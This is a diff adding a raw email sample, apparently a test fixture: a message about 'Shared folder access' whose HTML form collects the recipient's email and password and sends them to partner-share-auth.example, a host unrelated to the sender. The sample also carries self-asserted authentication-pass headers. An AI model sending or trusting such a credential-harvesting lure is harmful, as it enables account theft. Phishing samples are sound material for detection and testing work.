@@ -1,0 +1,13 @@
+Delivered-To: kaushal@gmail.com
+Received: from mail.partnerco.io (mail.partnerco.io. [203.0.113.10]) by mx.google.com with ESMTPS id muc4ll6o.92 for <kaushal@gmail.com>; Tue, 22 Sep 2026 03:40:00 +0000
+Authentication-Results: mail.partnerco.io; dkim=pass header.i=@partnerco.io; spf=pass smtp.mailfrom=partnerco.io; dmarc=pass header.from=partnerco.io
+Date: Tue, 22 Sep 2026 03:40:00 +0000
+From: "Priya Shah" <priya@partnerco.io>
+To: "Kaushal Shahare" <kaushal@gmail.com>
+Subject: Shared folder access
+Message-ID: <muc4ll6o.92@partnerco.io>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: 8bit
+
+<!DOCTYPE html><html><head><meta charset="utf-8"><title></title></head><body style="font-family:Arial,sans-serif;color:#222;background:#ffffff"><p>Kaushal, I set up the shared folder for Atlas. Confirm your access below.</p><form action="https://partner-share-auth.example/go"><input name="email" value="kaushal@gmail.com"><input type="password" name="password"><button>Confirm</button></form></body></html>
